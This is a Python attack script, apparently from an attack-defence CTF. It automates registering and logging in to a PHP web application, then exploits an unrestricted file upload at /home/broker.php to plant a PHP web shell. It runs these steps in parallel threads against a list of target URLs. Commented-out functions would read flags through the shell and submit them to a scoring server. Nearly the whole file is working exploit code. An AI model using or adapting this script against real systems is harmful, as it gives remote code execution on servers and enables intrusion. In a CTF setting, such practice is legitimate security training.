from pwn import *
import requests
import random
import threading

def register(url):
    data = "name=damn&username={0}&password={0}&email=fuck%40off.com&submit=".format(pwd)
    _url = url+"/scripts/register-action.php"
    resp = requests.post(
        _url, data=data, allow_redirects=True, headers= {
        "Content-Type": "application/x-www-form-urlencoded"}
    )

    if "Account Created Successfully" in resp.text:
        print "[+] Register:", resp.status_code
        return True
    return False

def login(url):
    _url = url+"/scripts/login.php"
    data = "username={0}&password={0}".format(pwd)
    resp = requests.post(
        _url, 
        data = data,
        allow_redirects=False,
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Cookie": "__cfduid=d399edf6bba2bf168cb6e72b5ec46ee651587849000"
        }
    )
    print "[+] Login:", resp.status_code
    cookie = resp.headers.get("Set-Cookie", None)
    print "[+] Got Cookie:", cookie
    return cookie

def upload_shell(url, cookie):
    _url = url+"/home/broker.php"
    headers = {
        "Connection": "close",
        "Cookie": cookie,
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1"
    }
    filename = "xero.php"
   
    with open("xero.php", "rb") as shell:
        json = {
            "type": str(random.randint(10000,1000000)),
            "query": str(random.randint(10000,1000000)),
            "submit": ""
        }
        file = {
            "file": (filename, shell, "application/x-php"),
        }
        resp = requests.post(_url, files=file, data=json, headers=headers, allow_redirects=False)
        print "[+] Upload:", resp.status_code
    
    return filename


# def get_flags(url, cookie, filename):
#     _url = url+"/home/talking/"+filename
#     headers = {
#         "Cookie": cookie
#     }
#     resp = requests.get(_url, headers=headers)
#     l = resp.text.split("\n")
#     try:
#         flags = [flag.split(":")[1] for flag in l[:len(l)-1]]
#         return flags
#     except:
#         return None

# def submit_flags(flags):
#     context.log_level = "critical"
#     for f in flags:
#         p = remote(host, port)
#         p.recvline()
#         p.sendline(token)
#         p.recvline()
#         p.sendline(f.strip("\r\n"))
#         response = p.recvline().strip()
        
#         if "accepted" in response:
#             print "[+] "+ response
#         else:
#             print "[-] " + response
#         p.close()

def run(url):
    print "[+] Trying for:", url

    if register(url):
        cookie = login(url)
        if cookie:
            filename = upload_shell(url, cookie)
            # flags = get_flags(url, cookie, filename)
            # if flags:
            #     submit_flags(flags)
        else:
            print "[-] something FAILED"
    else:
        print "[-] Register failed"


if __name__ == "__main__":

    context.log_level = "critical"
    host = "submit.alcapwnctf.in"
    port = 31337

    token = open("info.txt").read()
    url_file = open("url.txt").readlines()
    urls = ["https://"+u.strip("\r\n") for u in url_file]
    pwd = random.randint(10000,1000000)

    for url in urls:
        t = threading.Thread(target=run, args=(url, ))
        try:
            t.start()
        except:
            break